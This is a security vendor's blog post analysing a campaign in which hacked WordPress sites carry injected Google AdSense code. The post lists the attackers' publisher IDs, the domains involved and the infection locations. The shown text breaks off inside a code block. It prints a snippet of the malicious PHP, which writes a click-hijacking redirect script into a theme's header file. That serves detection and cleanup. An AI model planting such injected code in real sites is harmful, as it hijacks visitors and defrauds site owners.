---
title: Ad-Jacked: Cybercriminals Inject Google Adsense into WordPress
url: https://blog.sucuri.net/2025/04/ad-jacked-cybercriminals-inject-google-adsense-into-wordpress.html
source: Over Security - Cybersecurity news aggregator
date: 2025-04-16
fetch_date: 2025-10-06T22:08:13.253249
---

# Ad-Jacked: Cybercriminals Inject Google Adsense into WordPress

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Ad-Jacked: Cybercriminals Inject Google Adsense into WordPress

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* April 15, 2025

![Ad-Jacked Cybercriminals Inject Fake Google Adsense into WordPress](https://blog.sucuri.net/wp-content/uploads/2025/04/Ad-Jacked_-Cybercriminals-Inject-Fake-Google-Adsense-into-WordPress-820x385.png)

Recently, we’ve encountered cases where WordPress websites were impacted by  Google Adsense hijackers. Attackers inject advertisements and scripts that steal website resources and pump ad views for their adsense accounts.

This is not the first time we’ve seen attackers abusing popular Google services. In a previous case, we discovered a [credit card skimmer hiding inside Google Tag Manager](https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html), allowing attackers to steal payment information from Magento sites. Cybercriminals are leveraging trusted platforms like Google Adsense and Google Tag Manager to compromise websites.

![ad example](https://blog.sucuri.net/wp-content/uploads/2025/04/ad-example-342x600.png)

![ad example 2](https://blog.sucuri.net/wp-content/uploads/2025/04/ad-example-2-650x567.png)

## So, What’s Google Ads and AdSense, Anyway?

Before diving into the technical details of this infection, it’s important to understand what Google Ads and AdSense are supposed to be in their legitimate form.

**Google Ads** is an online advertising platform developed by Google where advertisers bid to display brief advertisements, service offerings, product listings, or videos to web users. Advertisers pay to display ads within the Google ad network to web users.

**Google AdSense**, on the other hand, is a program run by Google through which website publishers can serve automatic text, image, video, or interactive media advertisements that are targeted to site content and audience. These ads are administered, sorted, and maintained by Google, and they can generate revenue on either a per-click or per-impression basis.

```
<!-- Google AdSense Example (Earn Money) -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-XXXXXXXXXX"></script>
<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-XXXXXXXXXX"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
```

Website owners typically integrate these services by placing specific JavaScript code snippets on their pages, which then communicate with Google’s servers to display advertisements.

## What We Found?

We dug into a bunch of sites and found some sneaky Google AdSense code that wasn’t supposed to be there.

* pub-9649546719576241
* pub-7310257338111337

Domains found in this campaign that are currently blocklisted by Sucuri:

* **link-cpa-anda**[**.**]**com**
* **Asthmanotchcave**[**.**]**com**

```
function restore_cpa_script() {
    $header_file = get_theme_file_path('/header.php');
    $cpa_script = '<script>
document.addEventListener("click", function(event) {
    if (!sessionStorage.getItem("cpaClicked")) {
        sessionStorage.setItem("cpaClicked", "true");
        window.open("https://asthmanotchcave.com/eg9krbt4?key=ca70d4de2caae26150e52db1074f79ed", "_blank");
    }
}, { once: true });
</script>';
```

### How Many Sites Are We Talking About?

At the time of writing, at least [17 websites](https://publicwww.com/websites/%22pub-9649546719576241%22/) have been infected with these AdSense IDs.

![ad example 3](https://blog.sucuri.net/wp-content/uploads/2025/04/ad-example-3-212x600.png)

## Where is the Infection Found?

The malicious code has been found in multiple locations across infected WordPress sites, indicating a refined approach to ensure persistence even if one injection point is cleaned. The infection was discovered in:

* Theme’s **functions.php** file
* Inside the **mu-plugins** directory
* Inside various plugins directories
* Within the **wp\_options** table, specifically in the `option_name = wpheaderandfooter_basics` entry

## Analysis of the Malicious Code

Let’s examine the code that we found injected into these WordPress sites:

### Code Found in Theme’s functions.php

#### Managing the ads.txt File

This piece of code was injected into functions.php to modify the ads.txt file and it will be recreated automatically, ensuring the attacker’s ad network remains active:

```
add_action('...